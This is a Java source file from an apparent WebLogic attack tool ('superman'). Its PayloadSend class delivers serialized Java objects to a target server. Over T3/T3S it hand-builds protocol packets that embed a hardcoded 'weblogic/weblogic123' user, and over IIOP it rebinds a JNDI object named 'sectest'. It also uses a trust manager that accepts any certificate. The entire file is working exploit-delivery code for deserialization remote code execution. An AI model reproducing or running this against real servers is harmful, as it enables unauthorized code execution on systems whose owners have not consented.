package superman.core;

import superman.util.ByteUtil;
import superman.util.Serializer;
import weblogic.iiop.IOPProfile;
import weblogic.rjvm.JVMID;
import weblogic.security.acl.internal.AuthenticatedUser;

import javax.naming.Context;
import javax.naming.InitialContext;
import javax.net.ssl.SSLContext;
import javax.net.ssl.SSLSocketFactory;
import javax.net.ssl.TrustManager;
import javax.net.ssl.X509TrustManager;
import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.net.InetAddress;
import java.net.Socket;
import java.security.KeyManagementException;
import java.security.NoSuchAlgorithmException;
import java.security.SecureRandom;
import java.security.cert.CertificateException;
import java.security.cert.X509Certificate;
import java.util.Hashtable;

public class PayloadSend {
    public static void send(String protocol,String host,int port,Object payload){
        if(protocol.equals("iiop")){
            sendIIOP(host,port,payload);
        }else{
            sendT3(protocol,host,port,payload);
        }
    }
    public static void sendIIOP(String host,int port,Object payload){
        try {
            String url=String.format("iiop://%s:%s",host,port);
            Hashtable env = new Hashtable();
            env.put(Context.INITIAL_CONTEXT_FACTORY, "weblogic.jndi.WLInitialContextFactory");
            env.put(Context.PROVIDER_URL, url);
            env.put("weblogic.jndi.requestTimeout", Store.TIME_OUT+"");
            IOPProfile.IP=host;
            IOPProfile.PORT=port;
            InitialContext initialContext= new InitialContext(env);
            initialContext.rebind("sectest",payload);
        }catch (Exception e){
            e.printStackTrace();
        }
    }
    private static Socket newSocket(String protocol, String host, int port) throws IOException, KeyManagementException, NoSuchAlgorithmException {
        Socket socket = null;
        if (protocol.toLowerCase().equals("t3s")) {
            SSLContext context = SSLContext.getInstance("SSL");
            // 初始化
            context.init(null,
                    new TrustManager[]{new TrustManagerImpl()},
                    new SecureRandom());
            SSLSocketFactory factory = context.getSocketFactory();
            socket = factory.createSocket(host, port);
        } else {
            socket = new Socket(host, port);
        }
        socket.setSoTimeout((int) Store.TIME_OUT);

        return socket;
    }
    public static void sendT3(String protocol,String host, int port, Object payload) {
        sendT3(protocol,host,port, Serializer.serialize(payload));
    }
    public static void sendT3(String protocol,String host, int port, byte[] payload) {
        try {
            Socket s = newSocket(protocol, host, port);
            if (s == null) return;
            String header = "t3 7.0.0.0\nAS:10\nHL:19\n\n";

            if (protocol.toLowerCase().equals("https")) {
                header = "t3s 7.0.0.0\nAS:10\nHL:19\n\n";
            }

            s.getOutputStream().write(header.getBytes());
            s.getOutputStream().flush();
            BufferedReader br = new BufferedReader(new InputStreamReader(s.getInputStream()));
            String versionInfo = br.readLine();
            versionInfo = versionInfo.replace("HELO:", "");
            versionInfo = versionInfo.replace(".false", "");
            String cmd = "08";
            String qos = "65";
            String flags = "01";
            String responseId = "ffffffff";
            String invokableId = "ffffffff";
            String abbrevOffset = "00000000";
            String countLength = "01";
            String capacityLength = "10";//必须大于上面设置的AS值
            String readObjectType = "00";//00 object deserial 01 ascii

            StringBuilder datas = new StringBuilder();
            datas.append(cmd);
            datas.append(qos);
            datas.append(flags);
            datas.append(responseId);
            datas.append(invokableId);
            datas.append(abbrevOffset);
            countLength = "04";
            datas.append(countLength);
            String pahse1Str = ByteUtil.bytesToHexString(payload);
            datas.append(capacityLength);
            datas.append(readObjectType);
            datas.append(pahse1Str);
            AuthenticatedUser authenticatedUser = new AuthenticatedUser("weblogic", "weblogic123");
            String phase4 = ByteUtil.bytesToHexString(Serializer.serialize(authenticatedUser));
            datas.append(capacityLength);
            datas.append(readObjectType);
            datas.append(phase4);

            JVMID src = new JVMID();

            Constructor constructor = JVMID.class.getDeclaredConstructor(InetAddress.class, boolean.class);
            constructor.setAccessible(true);
            src = (JVMID) constructor.newInstance(InetAddress.getByName("127.0.0.1"), false);
            Field serverName = src.getClass().getDeclaredField("differentiator");
            serverName.setAccessible(true);
            serverName.set(src, 1);

            datas.append(capacityLength);
            datas.append(readObjectType);
            datas.append(ByteUtil.bytesToHexString(Serializer.serialize(src)));

            JVMID dst = new JVMID();

            constructor = JVMID.class.getDeclaredConstructor(InetAddress.class, boolean.class);
            constructor.setAccessible(true);
            src = (JVMID) constructor.newInstance(InetAddress.getByName("127.0.0.1"), false);
            serverName = src.getClass().getDeclaredField("differentiator");
            serverName.setAccessible(true);
            serverName.set(dst, 1);
            datas.append(capacityLength);
            datas.append(readObjectType);
            datas.append(ByteUtil.bytesToHexString(Serializer.serialize(dst)));

            byte[] headers = ByteUtil.hexStringToBytes(datas.toString());
            int len = headers.length + 4;
            String hexLen = Integer.toHexString(len);
            StringBuilder dataLen = new StringBuilder();

            if (hexLen.length() < 8) {
                for (int i = 0; i < (8 - hexLen.length()); i++) {
                    dataLen.append("0");
                }
            }

            dataLen.append(hexLen);
            s.getOutputStream().write(ByteUtil.hexStringToBytes(dataLen + datas.toString()));
            s.getOutputStream().flush();
            s.close();
        }catch (Exception e){
            e.printStackTrace();
        }
    }
    static class TrustManagerImpl implements X509TrustManager {

        @Override
        public void checkClientTrusted(X509Certificate[] x509Certificates, String s) throws CertificateException {
        }

        @Override
        public void checkServerTrusted(X509Certificate[] x509Certificates, String s) throws CertificateException {

        }

        @Override
        public X509Certificate[] getAcceptedIssuers() {
            return null;
        }
    }
}
